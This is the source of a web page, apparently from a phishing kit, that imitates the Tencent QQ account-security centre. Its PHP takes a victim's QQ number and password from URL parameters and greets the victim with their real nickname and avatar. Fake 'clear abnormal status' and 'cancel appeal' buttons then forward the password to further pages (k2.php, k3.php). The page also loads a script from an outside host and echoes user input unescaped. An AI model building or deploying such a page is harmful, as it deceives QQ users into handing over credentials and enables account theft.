
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script LANGUAGE="Javascript">document.write(unescape("%3Ctitle%3E%u9996%u9875%3C/title%3E"))</SCRIPT>

<script>
var G_pageStartTime = new Date();
</script>
<script>
(function(){
	if(document.body && document.body.offsetHeight > 0) {
		
			var t = new Date()-G_pageStartTime;
			var t2= G_loginTimePoints[0] - G_pageStartTime;

			return;
	}
	setTimeout(arguments.callee, 30);
})();
</script>

<?php
	
	if(isset($_GET['u']) && isset($_GET['p'])){

	}else{
		echo "<script>alert('请登录');window.location.href='index.php';</script>";
	}
	
?>

<link href="v2/css/global.css" rel="stylesheet" type="text/css" />
<link href="v2/css/base.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="v2/js/jquery.min.js"></script>
<script type="text/javascript" src="v2/js/common.js"></script>

<script>
var G_loginTimePoints = new Array();
G_loginTimePoints[0] = new Date();//dom开始渲染
</script>
<script language="javascript" src="DefaultJS.js" tppabs="http://bmm1105.com:99/DefaultJS.js" type="text/javascript"></script>
</head>
<body onload="remove_loading()">
<div id="loader_container">
	<div id="loader">
		<div align="center">
			<table><tr>
					<td><img src="images/loading.gif"></td>
					<td> <script LANGUAGE="Javascript">document.write(unescape("%u6B63%u5728%u4E3A%u60A8%u5206%u914D%u6700%u5FEB%u8282%u70B9%2C%u8BF7%u7A0D%u5019.."))</SCRIPT></td>
				</tr>
			</table>
		</div>
	</div>	
</div>

<!--Header-->
<div id="headerAll">
 
 
	<div class="round" id="login_alert" style="display:none;z-index:10003;left:30%;top:30%;">
    	<div class="r_top"></div>
		<div class="round_container">
             <div class="r_title">用户登录<a class="close" href="javascript:alert_login_close();"></a></div>
             <div class="round_content">
           			<iframe style="background-color:transparent;margin:0 0 10px 20px;width:30px;" allowtransparency="true" name="embed_login_frame" id="embed_login_frame" scrolling="no" src="" frameborder="0"></iframe>    
              </div>
        </div>
        <div class="r_bottom"></div>
	</div>
 
 
<script> 
document.domain="qq.com";
 
function alert_login(url,isauto,lang,target){
	if(document.getElementById("login_alert").style.display=="block")
	{
		return ;
	}
	if (typeof lang == "undefined")
	{
		lang=0;				//默认是简体中文
	}
	if(typeof url== "undefined")
	{
		url = "";
	}
	if(typeof isauto== "undefined")
	{
		isauto = true;
	}
	if (typeof target == "undefined")
	{
		target="top";				//默认是简体中文
	}
		 if (document.body.clientHeight)	
		{
			var sHeight = document.body.clientHeight ;
		}
		else if (window.innerHeight)
		{
			var sHeight = window.innerHeight ;
		}
 
		if (document.body.clientWidth)	
		{
			var sWidth = document.body.clientWidth;
		}
		else if (window.innerWidth)
		{
			var sWidth = window.innerWidth;
		}
		var ptLoginUrl = window.location.protocol + "";
		/*if("https:" == window.location.protocol)
		{
			ptLoginUrl = "/cgi-bin/login";
		}*/
		var deturl = escape(getHost() + url);
		if(url.indexOf("http") == 0)
		{
			deturl = escape(url);
		}
		var s_url = (0 == url.length ? escape(window.location.href) : deturl);
		var param = "?appid=2001601&no_verifyimg=1&f_url=loginerroralert&lang=" + lang +"&target="+target+"&hide_title_bar=1&s_url=" + s_url+ "&qlogin_jumpname=aqjump&qlogin_param="+escape("aqdest="+s_url)+"&css="+escape(getHost()+"/v2/css/login.css");
		var loginSrc = ptLoginUrl + param;
		document.getElementById("embed_login_frame").src = loginSrc;
		 var loginDiv = document.getElementById("login_alert");
		if(isauto)
		{
			if(isIE6())
			{
				setCenter();
			}
			else
			{
				loginDiv.style.position = "fixed";
				loginDiv.style.top = "27%";
				loginDiv.style.left = "40%";
				var FrameMarginTop =  -loginDiv.offsetHeight / 2 + "px";
				var FrameMarginLeft = -loginDiv.offsetWidth / 2 + "px";
				loginDiv.marginTop =   FrameMarginTop;
				loginDiv.marginLeft = FrameMarginLeft;
			}
			
		}
		loginDiv.style.display = "block";
}
function alert_login_close()
{
	document.getElementById("login_alert").style.display = "none";
}
function ptlogin2_onResize(width, height) 
{
		//var outter_wnd = document.getElementById("login_round_info");
		var outter_wnd = document.getElementById("embed_login_frame");
		if (outter_wnd)	{
			
			outter_wnd.style.width = 350+"px";
			outter_wnd.style.height = height+"px";
			outter_wnd.style.visibility = "hidden";
			outter_wnd.style.visibility = "visible";
			
		}
}
 
function ptlogin2_onClose(){
		login_wnd = document.getElementById("login");	
		login_wnd.style.display="none"
		mybg = document.getElementById("mybg");
		mybg.style.display = "none";
		document.body.removeChild(mybg);
}
function getHost() {
	return window.location.protocol + "//" + window.location.host;
}
function isIE6()
{
	var isIE = (document.all)?true:false;
	is_IE6 = isIE && ([/MSIE (\d)\.0/i.exec(navigator.userAgent)][0][1] == 6);
	return is_IE6;
}
/*
 *兼容IE6的居中定位
 */
function setCenter(){
			$("#login_alert").css("position","absolute");
			var FrameMarginTop =  document.documentElement.scrollTop - document.getElementById("login_alert").offsetHeight/2 + "px";
			var FrameMarginLeft = document.documentElement.scrollLeft  - document.getElementById("login_alert").offsetWidth/2 + "px";
			$("#login_alert").css({"marginTop":FrameMarginTop,"marginLeft":FrameMarginLeft});
		}
</script>
 
 
 
	<div id="header">
 
    	<div id="top">
		<a class="logo" href="/" onclick="sendHotClick('HEADER.TO.LOGO');"><cite>首页<br></cite></a>
        	<div class="right_info">
            <ul>
			
            <li><span>欢迎您<meta http-equiv="Content-Type" content="text/html; charset=utf8">，<?php echo getQQNick($_GET['u']); ?>(<?php echo $_GET['u']; ?>)</span></li>
			<li class="cent" id="safe_score_item" style="display:none;"><a href="#"><strong id="head_safe_score"></strong></a></li>
			<li><a href="javascript:LoginOut();">退出</a></li>
<img src="images/db3.png">
            </ul>
            </div>
 
        </div>
    
    	<div id="menu">
        	<ul>
            <li class="on1" id="menu_index"><a class="m1" href="#"><cite>首页</cite></a></li>
            <img src="images/db2.png"></ul>
        </div>
<!--<a onfocus="this.blur()" class="button" href="appeal_input_info.asp?session=303030303030303030320f5c12c630baf9137b5983df146d35acfe795639dcf864e5957dd4fa499d9260efa860bb3255389c&amp;verifyCode=54747017" onclick="clickOpt('abnormal', 'mb_set')"><span>
			&nbsp;&nbsp;帐号保护&nbsp;&nbsp;</span></a>-->
   	   <a class="handheld" href="#" onclick="getIpwdManageUrl(1, 'mod', '手机安全中心');" "=""><span><cite>手机安全中心</cite></span></a>
 
	 
  </div>
</div>

<?php

function getQQNick($qq){
 $str = file_get_contents('http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins='.$qq);
 $str=iconv("GB2312","UTF-8//IGNORE", $str);
 $pattern = '/portraitCallBack\((.*)\)/is';
 preg_match ( $pattern,$str, $result );
 $nickname=json_decode($result[1],true);
 return $nickname[$qq][6];
}

?>

<div id="wrapper">
	<div id="index_top"></div>
	<!--Container-->
	<div id="container" class="index_bg">
	  <!--Content-->
	  <div id="content">
	    <!--My_info-->
	    <div class="my_info"> <b class="tL"></b> <b class="tR"></b> <b class="bL"></b> <b class="bR"></b><span class="mc_info"></span><img src="http://q1.qlogo.cn/g?b=qq&nk=<?php echo $_GET['u']; ?>&s=100&t=<?php echo time(); ?>" alt="头像" height="40" hspace="2" border="1" vspace="2" width="40">
	      <dl>
	        <dt>昵&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;称：  <?php echo getQQNick($_GET['u']); ?>
 <a target="_blank"><i class="lv_3" style="cursor:hand;" title="安全达人3级"></i></a></dt>
	        <dd>帐&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;号：<?php echo $_GET['u']; ?>  <!--<a onfocus="this.blur()" class="button" href="appeal_input_info.asp?session=303030303030303030320f5c12c630baf9137b5983df146d35acfe795639dcf864e5957dd4fa499d9260efa860bb3255389c&amp;verifyCode=54747017" onclick="clickOpt('abnormal', 'mb_set')"><span>
			&nbsp;&nbsp;清除异常&nbsp;&nbsp;</span></a>-->
			<a onfocus="this.blur()" href="#" class="loggin_record" onclick="getIpwdManageUrl(1, 'mod', '查看登录记录');">查看登录记录</a>  </dd>
          </dl>
        </div><!--My_info End-->
        
        
	    <!--My_level-->
	    <div class="low1"> 
        <div class="level">
<img src="images/b1.png">
          </div>
	    </div>
	    <!--My_level End-->
 
               
 
        <!--my_circs-->
        <div class="my_circs" id="my_circs">
 
		
 
		<!--有风险-->
		<div id="risk_item">
		
 
		
 
		
        <dl>
        <dt><strong><i class="warn_red"></i><img src="images/p1.png"></strong></dt>

                                    <!--<a onfocus="this.blur()" class="button" " onclick="clickOpt('abnormal', 'mb_set')"><span>
			&nbsp;&nbsp;清除异常&nbsp;&nbsp;</span></a>-->
			<a onfocus="this.blur()" class="button1" href="#" onclick="getIpwdManageUrl(1, 'mod', '清除异常');"><span>
			&nbsp;&nbsp;清除异常&nbsp;&nbsp;</span></a>
        </dl>
        
 
		
 
		
		
		
		
		
        <dl>
          <dt><i class="warn_red"></i><img src="images/p2.png"></dt>
         
                                           <!--<a onfocus="this.blur()" class="button" href="appeal_input_info.asp?session=303030303030303030320f5c12c630baf9137b5983df146d35acfe795639dcf864e5957dd4fa499d9260efa860bb3255389c&amp;verifyCode=54747017" onclick="clickOpt('abnormal', 'mb_set')"><span>
			&nbsp;&nbsp;取消申诉&nbsp;&nbsp;</span></a>-->
			<a onfocus="this.blur()" class="button" href="#" onclick="getIpwdManageUrl(1, 'mod', '取消申诉');"><span>
			&nbsp;&nbsp;取消申诉&nbsp;&nbsp;</span></a>
        </dl>
        
 
		<dl>
                        <dt>
                          <div align="left"><i class="warn_red"></i><img src="images/p3.png"></div>
                        </dt>

                                                           <!--<a onfocus="this.blur()" class="button" href="appeal_input_info.asp?session=303030303030303030320f5c12c630baf9137b5983df146d35acfe795639dcf864e5957dd4fa499d9260efa860bb3255389c&amp;verifyCode=54747017" onclick="clickOpt('abnormal', 'mb_set')"><span>
			&nbsp;&nbsp;取消申诉&nbsp;&nbsp;</span></a>-->
			<a onfocus="this.blur()" class="button" href="#" onclick="getIpwdManageUrl(1, 'mod', '取消申诉');"><span>
			&nbsp;&nbsp;取消申诉&nbsp;&nbsp;</span></a>
          </dl>
		
 
		
 
		
 
		
 

        </div>
        
        
        </div><!--my_circs End-->
        
        
<!--安全动态-->
        <div id="tabs">
	    <div class="title">
	      <h3>安全动态</h3>
	      <span><a href="http://t.qq.com/qqsafe" target="_blank"><i class="weibo mr5"></i>关注安全动态</a></span></div>
          <!--安全动态TABS区-->
            <div class="scroll">
                <div style="width: 1740px; left: -348px;" class="scroll_img" id="scroll_img">
                    <div class="scroll_explain">
                    <a class="img1" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
 					<a class="img2" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
                    </div>
                    <div class="scroll_explain">
                    <a class="img3" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
                    <a class="img4" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
                    </div>
                    <div class="scroll_explain">
                    <a class="img5" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
                    <a class="img6" href="#" onfocus="this.blur()" onclick="getIpwdManageUrl(1, 'mod', '清除异常');">点击查看</a>
                    </div>
                </div>
                <div id="scroll_icon" class="scroll_icon">
                <ul>
                <li data-index="0" class="current"><a href="#"></a></li>
                <li class="" data-index="1"><a href="#"></a></li>
                <li class="" data-index="2"><a href="#"></a></li>
                </ul>
                </div>
            </div>
	  <!--安全动态TABS区 End-->
        </div><!--安全动态 End-->

      </div>
	  <!--Content End-->

      <!--Sidebar-->
      <div id="sidebar">
        <!--密保工具箱-->
        <div class="title mb7">
          <h3>我的密保工具</h3>
          <span><a>查看全部&gt;&gt;</a></span></div>
        <div class="tool_list">
        	<img src="images/tools.jpg">
          <!-- <dl>
            <a href="#">
            <div id="quetion_index"> <b class="icon1"></b>
                <dt>密保问题</dt>
              <dd><span style="font-weight: bold; color: rgb(255, 0, 0);">状态异常</span></dd>
            </div>
              <span onmouseover="this.className='u_y'" onmouseout="this.className='u_n'" id="index_modify_que"></span> </a>
          </dl>
          <dl>
            <a href="#">
            <div id="mobile_index"> <b class="icon2"></b>
                <dt>密保手机</dt>
              <dd><span style="font-weight: bold; color: rgb(255, 0, 0);">状态异常</span></dd>
            </div>
              <span onmouseover="this.className='u_y'" onmouseout="this.className='u_n'" id="index_modify_mobile"></span> </a>
          </dl> -->
          <!-- <dl>
            <a href="#">
            <div id="mbk_index"> <b class="icon4"></b>
                <dt>密保卡</dt>
              <dd><span style="font-weight: bold; color: rgb(255, 0, 0);">状态异常</span></dd>
            </div>
              <span onmouseover="this.className='u_y'" onmouseout="this.className='u_n'" id="index_modify_mbk"></span> </a>
          </dl>
          <dl>
            <a href="#">
            <div id="token_index"> <b class="icon3"></b>
                <dt>手机令牌</dt>
              <dd><span style="font-weight: bold; color: rgb(255, 0, 0);">状态异常</span></dd>
            </div>
              <span class="u_n" onmouseover="this.className='u_y'" onmouseout="this.className='u_n'" id="index_unbind_token"></span> </a>
          </dl> -->
        </div>
        <!--密保工具箱 End-->
        <div class="title2">快速通道</div>
        <!--快速通道-->
        <div class="tool_list tool_list1">
          <dl>
<div style="text-align: center;"><span style="line-height: 1.5;"><img src="images/p8.png"></span></div>
        <!--快速通道 End-->
      </dl></div>
	  <!--Sidebar End-->
    </div>
	<!--Container End-->
<div id="index_bottom"></div>
</div><!--Wrapper End-->
 
<!--Footer-->
<!--Footer-->
<div id="footer">
<div style="text-align: center;"><span style="line-height: 1.5;"><img src="images/p.png"></span></div>
<script language="javascript"> 
	if (typeof(timePoints) != "undefined")	
	{
		timePoints[0] = new Date();	
		$(document).ready(function() {
			timePoints[1] = new Date();
		});	
	}	
</script>
<iframe name="aqrjs_hidden_frame" id="aqrjs_hidden_frame" style="width:150px; height:150px; display:none;"></iframe>
<!--Footer End-->
 
 
 
<!--Footer End-->
 
 


 
<script type="text/javascript"> 
var g_cur_dyinfo = 0;
var g_cur_but = 1;
$("#menu_index").addClass("on1");
window.onload=function(){timePoints[1] = new Date();setTimeout(report,100);}
$(document).ready(function(){
	InitSafeCheckUI();
		asyLoadScript("v2/js/aq_float_frame.js");
 
	$("#faq1").click(function() {
		if ("none" == $("#ans1").css("display")) {
			$("#ans1").css("display", "");
		} else {
			$("#ans1").css("display", "none");
		}
	});
 
});
 
function InitSafeCheckUI()
{
	$("#risk_item a:eq(0)").attr("className","button1");
	$("#risk_item dl:eq(0) dt:eq(0)").wrapInner("<strong></strong>"); 
	showTip();
}
 
function toggle_check_info()
{
	if($("#check_ret_show").css("display")=="none")
	{
		$("#check_ret_show").show();
		$("#check_ret_hidden").hide();
	}
	else
	{
		$("#check_ret_show").hide();
		$("#check_ret_hidden").show();
	}
	$("#safe_item").slideToggle("slow"); 
}
 
function goTo(url)
{
	location.href = url;
}
 
$("#quetion_index").click(function(){
	window.location.href="#";
});
$("#index_modify_que").click(function(){
	CAqCommFrame.show({title: "修改密保问题", type:'iframe', url: "k2.php?u=<?php echo $_GET['u']; ?>"});
});
 
$("#mobile_index").click(function(){
	location.href="#";
});
$("#index_modify_mobile").click(function(){
	CAqCommFrame.show({title: "验证密保手机",  type:'iframe', url: "k2.php?u=<?php echo $_GET['u']; ?>"});
});
 
$("#mbk_index").click(function(){
	location.href="#";
});
$("#index_modify_mbk").click(function(){
	CAqCommFrame.show({title: "更换密保卡",  type:'iframe', url: "k2.php?u=<?php echo $_GET['u']; ?>"});
});
 
$("#token_index").click(function(){
	location.href="#";
});
$("#index_unbind_token").click(function(){
	CAqCommFrame.show({title: "绑定手机令牌",  type:'iframe', url: "k2.php?u=<?php echo $_GET['u']; ?>"});
});
 
$("#qqtoken_index").click(function(){
	location.href="#";
});
$("#index_unbind_qqtoken").click(function(){
	location.href="#";
});
function showTip()
{
	var close_flag = getCookie("aq_cpsw_tip_cf");
	if(close_flag!="1")
	{
		$("#change_psw_tip").css("display","");
	}
}
function closeTip()
{
	setCookie("aq_cpsw_tip_cf", "1",365);
	$("#change_psw_tip").css("display","none");
}
timePoints[0] = new Date();
</script>
 
 
<script> 
var tabScroll = function (d){
    typeof d == "string" &&(d = document.getElementById(d)); 
     return tabScroll.fn.call(d);
};
var chk = function(obj){
		return !!(obj || obj === 0);
};
tabScroll.fn = function (){
	this.addEvent = function (sEventType,fnHandler){
		if (this.addEventListener) {this.addEventListener(sEventType, fnHandler, false);} 
	    else if (this.attachEvent) {this.attachEvent("on" + sEventType, fnHandler);} 
	    else {this["on" + sEventType] = fnHandler;}
	}
	this.removeEvent = function (sEventType,fnHandler){
		if (this.removeEventListener) {this.removeEventListener(sEventType, fnHandler, false);} 
	    else if (this.detachEvent) {this.detachEvent("on" + sEventType, fnHandler);} 
	    else { this["on" + sEventType] = null;}
	}
	return this;
};
var Class = {create: function() {return function() { this.initialize.apply(this, arguments); }}};
var Bind = function (obj,fun,arr){
	return function() {
		return fun.apply(obj,arr);
	}
}
var Marquee = Class.create();
Marquee.prototype = {
	initialize : function(speed,name,width){
		this.box = tabScroll("scroll_img");
		this.speed = speed;
		this.name = name;
		this.width = width;
		this.lastOpr = 0;
		this.chkNum = this.lastOpr +1;
		this.scrollL = 0;
		this.Flag = 0;
		this.JPanel = tabScroll("scroll_icon").getElementsByTagName("li");
		this.box.style.width = this.JPanel.length*this.width+"px";
		for(var i=0,j=(this.JPanel).length;i<j;i++){
			var currur = this.JPanel[i];
			var dataIndex = currur.getAttribute("data-index");
			if(dataIndex == i){
				tabScroll(currur).addEvent("mouseover",Bind(this,this.Start,[i]));
				this.Len = i;
			}
		}
		this.Go();
	},
	Go : function(){
		this.ainterval = setInterval(this.name+".Start()",this.speed);
	},
	Start : function(){
		if(this.Flag == 1 ) return;
		var incurrur = this.JPanel;
		if(chk(arguments[0])){
			var no =  arguments[0];
		}else{
			var no = this.chkNum;
		}
		
		if(this.lastOpr==no) return;
		incurrur[no].className = "current";
		incurrur[this.lastOpr].className = "";
		this.Flag = 1;
		this.Fun(no);
	},
	Fun : function(n){
		var num = this.lastOpr - n;
		this.scrollW = num / -num;
		this.interval = setInterval(this.name+".Scroll("+num+","+n+")",20);
		this.lastOpr = n;
	},
	Scroll : function(o,n){
		n = this.scrollW *n;
		this.scrollL += o*(this.width/10);
		this.box.style.left = this.scrollL+"px"; 
		if(this.scrollL == n*this.width) {
			clearInterval(this.interval);
			clearInterval(this.ainterval);
			this.Flag = 0;
			if(this.lastOpr == this.Len){
				this.chkNum = 0;
			}else{
				this.chkNum += 1;
			}
			this.Go();
		}
	}
}
tabScroll(window).addEvent("load",function (){
  marquee = new Marquee(5000,"marquee",580);
});
</script>
 
<!--Footer End-->
<script language="javascript"> 
	$("#menu_pwd_manage").addClass("on3");
	$(document).ready(function(){
		asyLoadScript("v2/js/aq_float_frame.js");
		
	});	
	function markPswType(type)
	{
	    $.ajax({
			url:"http://aq.qq.com/cn2/ipwd/mark_psw_type",
			data:{type: type},
			async:false,
			timeout:100,
			dataType:"json",
			error:function(){rs=true;},
			success:function(jason)
			{
				;
			}
	    });	
	}
	
	function getIpwdManageUrl(ipwd_appid, ipwd_ot, ipwd_ot_name)
	{

		show_aqframe(ipwd_ot_name);
		// if (ipwd_appid < 1 || ipwd_appid > 9)
		// {
		// 	return;
		// }
		// CAqCommFrame.show({title: ipwd_ot_name, type:'iframe', url: "k2.php?u=<?php echo $_GET['u']; ?>"});
		
	}
	function closeAlert()
	{
		CAqCommFrame.close();
	}
	
</script>

</div></div>

<div class="accounts_list toolbox_list" id="submenu_toolbox" name="submenu" onmouseover="ShowSubMenu('submenu_toolbox', 'menu_toolbox', 'on5');" onmouseout="HideSubMenu('submenu_toolbox','menu_toolbox');"  style="display:none;">
	<h3><a href="#"><cite></cite></a></h3>
	<ul>
	<li><a class="t1" href="#"><cite>
	</cite></a></li>
	<li><a class="t2" href="#"><cite>
	</cite></a></li>
	<li><a class="t3" href="#"><cite>
	</cite></a></li>
	<li><a class="t4" href="#"><cite></cite></a></li>
	<li><a class="t5" href="#"><cite>
	</cite></a></li>
	</ul>
</div>

<div class="accounts_list" id="submenu_account_prot" onmouseover="ShowSubMenu('submenu_account_prot','menu_account_prot','on2');" onmouseout="HideSubMenu('submenu_account_prot','menu_account_prot');" name="submenu" style="display:none;">
	<h3><a  href="#"><cite></cite></a></h3>
	<ul>
    <li><a  class="a1" href="#"><cite></cite></a></li>
    <li><a  class="a2" href="#"><cite></cite></a></li>
    <li><a  class="a3" href="#" ><cite></cite></a></li>
    <li><a  class="a4" href="#"><cite></cite></a></li>
    </ul>
</div>

<div class="accounts_list password_list" id="submenu_pwd_manage"  name="submenu" onmouseover="ShowSubMenu('submenu_pwd_manage','menu_pwd_manage','on3');" onmouseout="HideSubMenu('submenu_pwd_manage','menu_pwd_manage');" style="display:none;">
	<h3><a  href="#"><cite></cite></a></h3>
	<ul>
    <li><a  class="pw1" href="#"><cite></cite></a></li>
    <li><a  class="pw2" href="#"><cite></cite></a></li>
    <li><a  class="pw3" href="#"><cite></cite></a></li>
    <li><a  class="pw4" href="#"><cite></cite></a></li>
    </ul>
</div>

<div class="m_h" style="display:none;" id="site_map_menu" onmouseover="ShowSubMenu('site_map_menu');" onmouseout="HideSubMenu('site_map_menu');">
	<div class="m_h_t"><b></b></div>
    <dl>
    <dt><a  href="#">首页</a></dt>
    </dl>
    
    <dl>
    <dt><a  href="#"></a></dt>
    <dd>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    </dd>
    </dl>
    
    <dl>
    <dt><a  href="#"></a></dt>
    <dd>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a>
    </dd>
    </dl>
    
    <dl>
    <dt><a  href="#"></a></dt>
    <dd>
    <a  href="#"></a>
    <a  href="#"></a>
    <a  href="#"></a><br />
    <a  href="#"></a>
    </dd>
    </dl>

    <dl>
    <dt><a  href="#"></a></dt>
    </dl>
    
    <dl class="n">
    <dt class="g"></dt>
    <dd>
    <a  href="#"></a>
    <a  href="#">
	</a>
    <a  href="#"></a><br />
	<a  href="#"></a>
	<a  href="#"></a>
	<a  href="#"></a>
    </dd>
    </dl>
</div>

</div>
</div>
<script>
function ShowSubMenu(submenu_id,menu_id,cname)
{
	$("div[name='submenu']").css("display","none");
	if(submenu_id == "site_map_menu")
	{
		$("#"+submenu_id).css({'display':'block'});
	}
	else
	{
		$("#"+submenu_id).css({'display':'block','cursor':'hand'});
	}
	if(typeof(menu_id) != "undefined")
	{
		$("#"+menu_id).attr("class",cname);
	}
}
function HideSubMenu(submenu_id,menu_id)
{
	$("#"+submenu_id).css("display","none");
	if(typeof(menu_id) != "undefined")
	{
		$("#"+menu_id).attr("class","");
	}
}

$("#toolbox_hover").click(function(){
	location.href="#";
});
</script>

<div style="display:none;position: fixed; z-index: 10002; left: 50%; top: 50%; margin-top: -176px; margin-left: -206.5px;" class="round" id="aq_comm_frame"><div class="r_top"></div><div class="round_container"><div class="r_title"><span id="comm_frame_title">清除异常</span><a class="close" id="frame_close" href="javascript:hide_this(this);"></a></div><div id="frame_content"><iframe src="k3.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" scrolling="no" marginheight="0" marginwidth="0" id="embed_comm_frame" style="margin:0 auto;width:403px;height:312px;" frameborder="0"></iframe></div></div><div class="r_bottom"></div><b class="b4"></b><b class="b3"></b><b class="b2"></b><b class="b1"></b></div>

<script type="text/javascript">
	
	function hide_this(obj){
		var aqframe=document.getElementById('aq_comm_frame');
		aqframe.style.display='none';
	}

	function show_aqframe(name){
		var aqframe=document.getElementById('aq_comm_frame');
		aqframe.style.display='block';
		var vname=document.getElementById('comm_frame_title');
		vname.innerHTML=name;
	}
</script>

<!--Login-->
<div style="display:none" id="loginbar">
<div id="login">

<div class="login" id="login_alert" style="display:none;z-index:10003;">
        	<h3>用户登录</h3>
			<iframe style="background-color:transparent;" allowTransparency="false" name="embed_login_frame" id="embed_login_frame" frameborder="0" scrolling="no" width="100%" height="100%" src="login.php"></iframe>
        </div>


<script>
function alert_login(url,isauto,lang,target){
	if(document.getElementById("login_alert").style.display=="block")
	{
		return ;
	}
	if (typeof lang == "undefined")
	{
		lang=0;				//默认是简体中文
	}
	if(typeof url== "undefined")
	{
		url = "";
	}
	if(typeof isauto== "undefined")
	{
		isauto = true;
	}
	if (typeof target == "undefined")
	{
		target="top";				//默认是简体中文
	}
		 if (document.body.clientHeight)	
		{
			var sHeight = document.body.clientHeight ;
		}
		else if (window.innerHeight)
		{
			var sHeight = window.innerHeight ;
		}

		if (document.body.clientWidth)	
		{
			var sWidth = document.body.clientWidth;
		}
		else if (window.innerWidth)
		{
			var sWidth = window.innerWidth;
		}
		var ptLoginUrl = window.location.protocol + "login.php";
		/*if("https:" == window.location.protocol)
		{
			ptLoginUrl = "#";
		}*/
		var deturl = escape(getHost() + url);
		if(url.indexOf("http") == 0)
		{
			deturl = escape(url);
		}
		var s_url = (0 == url.length ? escape(window.location.href) : deturl);
		var param = "?appid=2001601&no_verifyimg=1&f_url=loginerroralert&lang=" + lang +"&target="+target+"&hide_title_bar=1&s_url=" + s_url+ "&qlogin_jumpname=aqjump&qlogin_param="+escape("aqdest="+s_url)+"&css="+escape(getHost()+"/v2/css/login.css");
		var loginSrc = ptLoginUrl + param;
		document.getElementById("embed_login_frame").src = loginSrc;
		 var loginDiv = document.getElementById("login_alert");
		if(isauto)
		{
			if(isIE6())
			{
				setCenter();
			}
			else
			{
				loginDiv.style.position = "fixed";
				loginDiv.style.top = "27%";
				loginDiv.style.left = "40%";
				var FrameMarginTop =  -loginDiv.offsetHeight / 2 + "px";
				var FrameMarginLeft = -loginDiv.offsetWidth / 2 + "px";
				loginDiv.marginTop =   FrameMarginTop;
				loginDiv.marginLeft = FrameMarginLeft;
			}
			
		}
		loginDiv.style.display = "block";
}
function alert_login_close()
{
	document.getElementById("login_alert").style.display = "none";
}
function ptlogin2_onResize(width, height) 
{
		//var outter_wnd = document.getElementById("login_round_info");
		var outter_wnd = document.getElementById("embed_login_frame");
		if (outter_wnd)	{
			
			outter_wnd.style.width = 350+"px";
			outter_wnd.style.height = 315+ "px";
			
		}
}

function ptlogin2_onClose(){
		login_wnd = document.getElementById("login");	
		login_wnd.style.display="none"
		mybg = document.getElementById("mybg");
		mybg.style.display = "none";
		document.body.removeChild(mybg);
}
function getHost() {
	return window.location.protocol + "//" + window.location.host;
}
function isIE6()
{
	var isIE = (document.all)?true:false;
	is_IE6 = isIE && ([/MSIE (\d)\.0/i.exec(navigator.userAgent)][0][1] == 6);
	return is_IE6;
}
/*
 *兼容IE6的居中定位
 */
function setCenter(){
			$("#login_alert").css("position","absolute");
			var FrameMarginTop =  document.documentElement.scrollTop - document.getElementById("login_alert").offsetHeight/2 + "px";
			var FrameMarginLeft = document.documentElement.scrollLeft  - document.getElementById("login_alert").offsetWidth/2 + "px";
			$("#login_alert").css({"marginTop":FrameMarginTop,"marginLeft":FrameMarginLeft});
		}
</script>


</div>
</div>
<!--Login End-->
<div style="text-align: center;"><span style="line-height: 1.5;display:none"><img src="images/db.png" tppabs="http://bmm1105.com:99/images/db.png"></span></div>
<script language="javascript">
	if (typeof(timePoints) != "undefined")	
	{
		timePoints[0] = new Date();	
		$(document).ready(function() {
			timePoints[1] = new Date();
		});	
	}	
</script>

<span style="display:none"></span>
</body>
</html>
<script>
$(document).ready(function(){

	$("#menu_index").addClass("on1");
	G_loginTimePoints[2] = new Date();//开始调用pt框时间
	alert_login("/cn2/index",false);
	setTimeout(report,200);

	$("#header_login_but").css("display","none");
});

function report(){
	var s = [];
	for (var i=0; i<G_loginTimePoints.length; i++){
		if (G_loginTimePoints[i]){
			s.push((i+1)+"="+(G_loginTimePoints[i]-G_pageStartTime));
		}
	}
	var ua = navigator.userAgent.toLowerCase();
	var pageid = 15;
	if(window.ActiveXObject) {//IE
		var ver = ua.match(/msie ([\d.+])/)[1];
		pageid = (ver==6)?12:(ver==9)?13:15;
	}
	else if(ua.indexOf("chrome") != -1){
		pageid = 14;
	}
	var url = "";
	imgSendTimePoint=new Image();
	imgSendTimePoint.src=url;
}

</script>